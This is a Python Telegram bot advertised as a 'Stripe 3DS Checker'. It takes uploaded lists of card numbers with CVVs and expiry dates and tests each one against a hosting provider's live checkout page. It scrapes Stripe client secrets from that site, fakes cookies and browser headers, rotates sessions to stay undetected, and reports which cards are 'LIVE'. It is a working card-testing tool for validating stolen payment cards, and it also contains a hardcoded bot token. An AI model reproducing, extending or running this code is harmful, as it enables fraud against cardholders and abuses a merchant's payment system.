#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
from bs4 import BeautifulSoup
import time
from typing import Dict, List, Tuple
import threading

# بيانات البوت
TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_ID = 5895491379

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# تخزين البيانات
user_cards = {}
checking_status = {}

# ألوان للطباعة
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
WHITE = "\033[97m"
RESET = "\033[0m"

# فحص Luhn Algorithm
def luhn_check(card_number):
    digits = [int(d) for d in card_number if d.isdigit()]
    checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
    return checksum % 10 == 0

# كلاس لفحص الكروت باستخدام Stripe
class StripeChecker:
    def __init__(self):
        self.public_key = None
        self.client_secret = None
        self.cookies = None
        self.headers = None
        self.stripe_headers = None
        self.check_count = 0
        self.session_refresh_count = 0
        self.initialize_session()

    def initialize_session(self):
        """تهيئة الجلسة الجديدة مع كوكيز وهيدرز جديدة"""
        print(f"{YELLOW}🔄 Initializing new session...{RESET}")
        
        current_time = int(time.time())
        
        # كوكيز جديدة ديناميكية
        self.cookies = {
            '_gcl_au': f'1.1.{current_time}{current_time % 1000}',
            '_ga': f'GA1.2.{current_time}{current_time % 10000}',
            '_gid': f'GA1.2.{current_time + 100}{current_time % 5000}',
            '_fbp': f'fb.1.{current_time}.{current_time * 2}',
            '_ga_L9P8FSN26L': f'GS2.1.s{current_time}$o1$g0$t{current_time + 50}$j60$l0$h0',
            '__adroll_fpc': f'{hex(current_time)[2:]}-{current_time}',
            'SESSID96d7': hex(current_time * 1000)[2:],
            '__stripe_mid': f'{hex(current_time)[2:]}-{hex(current_time + 100)[2:]}',
            '__stripe_sid': f'{hex(current_time)[2:]}-{hex(current_time + 200)[2:]}',
            'Cart-Session': hex(current_time * 1000)[2:],
        }

        # هيدرز ديناميكية
        self.headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'referer': 'https://cp.altushost.com/?/cart/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
            'x-csrf-token': hex(current_time * 1000)[2:],
            'x-requested-with': 'XMLHttpRequest',
        }

        self.stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
        }

        self.check_count = 0
        self.session_refresh_count += 1
        print(f"{GREEN}✅ Session #{self.session_refresh_count} initialized!{RESET}")

    def fetch_stripe_keys(self) -> bool:
        """جلب مفاتيح Stripe جديدة"""
        params = {'cmd': 'stripe_intents_3dsecure', 'action': 'cart'}
        
        for attempt in range(3):
            try:
                print(f"{YELLOW}🔑 Fetching new Stripe keys (attempt {attempt + 1})...{RESET}")
                
                response = requests.get(
                    'https://cp.altushost.com/', 
                    params=params, 
                    cookies=self.cookies, 
                    headers=self.headers,
                    timeout=15
                )
                
                soup = BeautifulSoup(response.text, "html.parser")
                script_tags = soup.find_all("script")
                
                important_values = {}
                for script in script_tags:
                    if "Stripe(" in script.text:
                        if "Stripe('" in script.text:
                            start = script.text.find("Stripe('") + len("Stripe('")
                            end = script.text.find("')", start)
                            important_values["public_key"] = script.text[start:end]
                        if "handleCardSetup(" in script.text:
                            start = script.text.find("handleCardSetup(") + len("handleCardSetup(")
                            part = script.text[start:].split(",")[0]
                            important_values["client_secret"] = part.strip().strip('"')
                
                if not important_values.get("client_secret"):
                    raise ValueError("Failed to extract client_secret")
                    
                self.public_key = important_values.get("public_key", "pk_live_88NPqxaecGYmZwJqsjzbKJkn")
                self.client_secret = important_values["client_secret"]
                
                print(f"{GREEN}✅ Keys fetched successfully!{RESET}")
                print(f"{WHITE}   Public Key: {self.public_key[:30]}...{RESET}")
                print(f"{WHITE}   Client Secret: {self.client_secret[:30]}...{RESET}")
                return True
                
            except Exception as e:
                print(f"{RED}❌ Attempt {attempt + 1} failed: {str(e)}{RESET}")
                if attempt < 2:
                    time.sleep(2 ** attempt)
                    continue
                return False
        
        return False

    def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
        """فحص الكرت مع جلب client_secret جديد لكل فحص"""
        time.sleep(1.5)
        start_time = time.time()
        
        # زيادة العداد
        self.check_count += 1
        
        # تجديد الجلسة كل 10 فحوصات
        if self.check_count > 1 and self.check_count % 10 == 1:
            print(f"{YELLOW}🔄 Refreshing session after {self.check_count - 1} checks...{RESET}")
            self.initialize_session()

        # فحص Luhn
        if not luhn_check(card['number']):
            return {
                'status': 'ERROR',
                'message': 'Invalid card number (Luhn check failed)',
                'details': {},
                'time': round(time.time() - start_time, 2)
            }

        # جلب client_secret جديد لكل فحص
        print(f"{YELLOW}📋 Check #{self.check_count}: Fetching fresh client_secret...{RESET}")
        if not self.fetch_stripe_keys():
            if retry_count < 2:
                print(f"{YELLOW}⚠️ Retrying... (attempt {retry_count + 2})...{RESET}")
                time.sleep(2)
                return self.check_card(card, retry_count + 1)
            return {
                'status': 'ERROR',
                'message': 'Failed to fetch client_secret',
                'details': {'check_number': self.check_count},
                'time': round(time.time() - start_time, 2)
            }

        try:
            current_time = int(time.time())
            
            # أول طلب: تأكيد Setup Intent
            for attempt in range(3):
                try:
                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]={hex(current_time)[2:]}&payment_method_data[muid]={self.cookies["__stripe_mid"]}&payment_method_data[sid]={self.cookies["__stripe_sid"]}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]={current_time}&payment_method_data[client_attribution_metadata][client_session_id]={hex(current_time)[2:]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_secret={self.client_secret}'
                    
                    response = requests.post(
                        f'https://api.stripe.com/v1/setup_intents/{self.client_secret.split("_secret_")[0]}/confirm',
                        headers=self.stripe_headers,
                        data=data,
                        timeout=20
                    )
                    setup_intent = response.json()
                    break
                except Exception as e:
                    if attempt < 2:
                        time.sleep(2 ** attempt)
                        continue
                    return {
                        'status': 'ERROR',
                        'message': f'Setup Intent Error - {str(e)}',
                        'details': {'check_number': self.check_count},
                        'time': round(time.time() - start_time, 2)
                    }

            if 'error' in setup_intent:
                error_msg = setup_intent["error"].get("message", "Unknown error")
                error_type = setup_intent["error"].get("type", "unknown")
                error_code = setup_intent["error"].get("code", "unknown")
                
                print(f"{RED}❌ Setup Intent Error: {error_msg}{RESET}")
                
                # التعامل مع أخطاء 3DS2
                if "3D Secure 2 is not supported" in error_msg or "3D Secure" in error_msg:
                    return {
                        'status': 'DECLINED',
                        'message': '❌ Card Not Supported (3DS2 Issue)',
                        'details': {
                            'check_number': self.check_count,
                            'status_3ds': 'Not Supported',
                            'error_type': error_type
                        },
                        'time': round(time.time() - start_time, 2)
                    }
                
                # أخطاء البطاقة المرفوضة
                if error_code in ['card_declined', 'insufficient_funds', 'lost_card', 'stolen_card']:
                    return {
                        'status': 'DECLINED',
                        'message': f'❌ Card Declined - {error_msg}',
                        'details': {
                            'check_number': self.check_count,
                            'status_3ds': 'Declined',
                            'error_code': error_code
                        },
                        'time': round(time.time() - start_time, 2)
                    }
                
                # باقي الأخطاء
                return {
                    'status': 'ERROR',
                    'message': f'Setup Intent Error - {error_msg}',
                    'details': {
                        'check_number': self.check_count,
                        'error_type': error_type,
                        'error_code': error_code
                    },
                    'time': round(time.time() - start_time, 2)
                }

            if setup_intent.get('status') == 'requires_action' and setup_intent.get('next_action', {}).get('type') == 'use_stripe_sdk':
                three_d_secure_source = setup_intent.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')

                # ثاني طلب: تصديق 3DS2
                for attempt in range(3):
                    try:
                        data = f'source={three_d_secure_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={self.public_key}'
                        
                        response = requests.post(
                            'https://api.stripe.com/v1/3ds2/authenticate', 
                            headers=self.stripe_headers, 
                            data=data,
                            timeout=20
                        )
                        three_ds_response = response.json()
                        
                        # التحقق من وجود خطأ في الـ 3DS2
                        if 'error' in three_ds_response:
                            error_msg = three_ds_response['error'].get('message', 'Unknown error')
                            print(f"{RED}❌ 3DS2 Error: {error_msg}{RESET}")
                            
                            if "3D Secure 2 is not supported" in error_msg or "not supported" in error_msg:
                                return {
                                    'status': 'DECLINED',
                                    'message': '❌ 3DS2 Not Supported',
                                    'details': {
                                        'check_number': self.check_count,
                                        'status_3ds': 'Not Supported'
                                    },
                                    'time': round(time.time() - start_time, 2)
                                }
                        
                        break
                    except Exception as e:
                        if attempt < 2:
                            time.sleep(2 ** attempt)
                            continue
                        return {
                            'status': 'ERROR',
                            'message': f'3DS2 Error - {str(e)}',
                            'details': {'check_number': self.check_count},
                            'time': round(time.time() - start_time, 2)
                        }

                trans_status = three_ds_response.get('ares', {}).get('transStatus')
                acs_url = three_ds_response.get('ares', {}).get('acsURL')
                
                # لو ما فيش status يبقى في مشكلة
                if not trans_status and not three_ds_response.get('ares'):
                    print(f"{RED}❌ No 3DS response data{RESET}")
                    return {
                        'status': 'DECLINED',
                        'message': '❌ 3DS Authentication Failed',
                        'details': {
                            'check_number': self.check_count,
                            'status_3ds': 'Failed',
                            'session_number': self.session_refresh_count
                        },
                        'time': round(time.time() - start_time, 2)
                    }

                details = {
                    'status_3ds': trans_status or 'Failed',
                    'check_number': self.check_count,
                    'session_number': self.session_refresh_count
                }
                
                print(f"{WHITE}🔐 3DS Status: {trans_status or 'None'}{RESET}")
                
                if trans_status == 'N':
                    print(f"{GREEN}✅ LIVE CARD FOUND!{RESET}")
                    return {
                        'status': 'LIVE',
                        'message': '✅ Charged Successfully',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                elif trans_status in ('R', 'C') and acs_url:
                    print(f"{YELLOW}🔐 OTP Required{RESET}")
                    return {
                        'status': 'OTP',
                        'message': '🔐 3D Secure Challenge Required',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                elif trans_status in ('R', 'C') and not acs_url:
                    print(f"{RED}❌ Card Declined{RESET}")
                    return {
                        'status': 'DECLINED',
                        'message': '❌ Operation Rejected',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                else:
                    print(f"{RED}❓ Unknown Status: {trans_status}{RESET}")
                    return {
                        'status': 'ERROR',
                        'message': f'❓ Unknown Status: {trans_status}',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
            else:
                details = {
                    'status_3ds': setup_intent.get('status', 'N/A'),
                    'check_number': self.check_count,
                    'session_number': self.session_refresh_count
                }
                
                if setup_intent.get('status') == 'succeeded':
                    print(f"{GREEN}✅ Setup Intent Succeeded!{RESET}")
                    return {
                        'status': 'LIVE',
                        'message': '✅ Setup Intent Confirmed Successfully',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                
                print(f"{RED}❌ Setup Intent Failed: {setup_intent.get('status')}{RESET}")
                return {
                    'status': 'ERROR',
                    'message': 'Further Action Required or Setup Intent Failed',
                    'details': details,
                    'time': round(time.time() - start_time, 2)
                }
                
        except Exception as e:
            print(f"{RED}❌ Exception: {str(e)}{RESET}")
            return {
                'status': 'ERROR',
                'message': f'Error - {str(e)}',
                'details': {'check_number': self.check_count, 'session_number': self.session_refresh_count},
                'time': round(time.time() - start_time, 2)
            }

# Bot Handlers
@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Stripe 3DS Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results  
🔒 Secure Processing
💳 Only LIVE Cards Sent
🔄 Fresh Keys Every Check
🔄 Session Refresh Every 10 Checks

📤 Send your combo file or card details to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        
        cards = []
        for line in lines:
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cards.append({
                        'number': parts[0].strip(),
                        'month': parts[1].strip().zfill(2),
                        'year': parts[2].strip(),
                        'cvv': parts[3].strip(),
                        'raw': line
                    })
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        
        user_cards[user_id] = cards
        checking_status[user_id] = False
        
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: Stripe 3DS
🔄 Fresh Keys: Every Check
🔄 Session Refresh: Every 10 Checks
⚡ Status: Ready

Click below to start checking:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        parts = text.split('|')
        user_cards[message.from_user.id] = [{
            'number': parts[0].strip(),
            'month': parts[1].strip().zfill(2),
            'year': parts[2].strip(),
            'cvv': parts[3].strip(),
            'raw': text
        }]
        checking_status[message.from_user.id] = False
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
🔥 Gateway: Stripe 3DS
⚡ Status: Ready
</b>""",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!
Use: Card|MM|YYYY|CVV
Example: 5127740082586858|11|2028|155
</b>""")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    
    if user_id not in user_cards or not user_cards[user_id]:
        bot.answer_callback_query(call.id, "❌ No cards loaded!")
        return
    
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already checking!")
        return
    
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="⏳ Initializing checker...\n🔐 Getting authorization keys...\n🔄 Fresh keys will be fetched for each card"
    )
    
    checker = StripeChecker()
    
    live = otp = declined = errors = checked = 0
    start_time = time.time()
    
    for card in cards:
        if not checking_status.get(user_id, True):
            break
        
        checked += 1
        result = checker.check_card(card)
        
        # إنشاء الكيبورد
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
        check_num = result.get('details', {}).get('check_number', checked)
        session_num = result.get('details', {}).get('session_number', 1)
        callback_data = f"show_result_{checked}"
        
        keyboard.add(
            types.InlineKeyboardButton(f"📋 Status: {status_3ds} | Check: #{check_num} | Session: #{session_num}", callback_data=callback_data)
        )
        keyboard.add(
            types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
            types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
        )
        
        if result['status'] == 'LIVE':
            live += 1
            details = result['details']
            msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec
🔐 3DS Status: {details['status_3ds']}
🔢 Check #: {details.get('check_number', checked)}
🔄 Session #: {details.get('session_number', 1)}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            bot.send_message(user_id, msg)
        elif result['status'] == 'OTP':
            otp += 1
        elif result['status'] == 'DECLINED':
            declined += 1
        else:
            errors += 1
        
        # تخزين النتيجة
        user_cards[user_id][checked-1]['result'] = result
        
        progress = int((checked / total) * 20)
        progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
        elapsed = time.time() - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        eta = (total - checked) / speed if speed > 0 else 0
        
        next_refresh = 10 - (checked % 10) if checked % 10 != 0 else 10
        
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"""<b>🔥 Gateway: Stripe 3DS
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {card['number'][:6]}...{card['number'][-4:]}
🔢 Check: {checked}/{total}
🔄 Session #: {checker.session_refresh_count}
⏭️ Next Session Refresh: {next_refresh} checks
</b>""",
                reply_markup=keyboard
            )
        except:
            pass
        
        time.sleep(0.5)
    
    # النتيجة النهائية
    total_time = time.time() - start_time
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ OTP 🔐: {otp}
├ Declined ❌: {declined}
├ Errors ⚠️: {errors}

⏱ Stats:
├ Time: {int(total_time)}s
├ Speed: {(total/total_time):.2f} cards/sec
└ Total Sessions: {checker.session_refresh_count}
━━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    )
    
    checking_status[user_id] = False
    del user_cards[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('show_result_'))
def show_card_result(call):
    user_id = call.from_user.id
    index = int(call.data.split('_')[-1]) - 1
    
    if user_id not in user_cards or index >= len(user_cards[user_id]):
        bot.answer_callback_query(call.id, "❌ No result found!")
        return
    
    card = user_cards[user_id][index]
    result = card.get('result', {})
    details = result.get('details', {})
    
    msg = f"""<b>{result.get('message', '❓ Unknown Status')}
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result.get('message', 'Unknown')}
⏱ Time: {result.get('time', 0)} sec
🔐 3DS Status: {details.get('status_3ds', 'N/A')}
🔢 Check Number: #{details.get('check_number', 'N/A')}
🔄 Session Number: #{details.get('session_number', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    
    bot.send_message(user_id, msg)
    bot.answer_callback_query(call.id, "📋 Result displayed!")

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Checking stopped!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt) or card details
2. Click "Start Checking"
3. Only LIVE cards sent, others via button

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740082586858|11|2028|155

🔄 Features:
• Fresh client_secret for EVERY card check
• Auto session refresh every 10 checks
• Real-time progress tracking
• Secure & fast processing
• No more N/A errors!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Stripe 3DS
🔥 Speed: Ultra Fast
✅ Accuracy: High
🔄 Fresh Keys: Every Check
🔄 Session Refresh: Every 10 Checks
🌐 Server: Active
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, status_text)

if __name__ == "__main__":
    print("=" * 50)
    print("🚀 Starting Stripe Checker Bot...")
    print("=" * 50)
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"🔑 Fresh Keys: Every Check")
    print(f"🔄 Session Refresh: Every 10 Checks")
    print(f"✅ Bot is running...")
    print("=" * 50)
    print()
    bot.polling(none_stop=True)
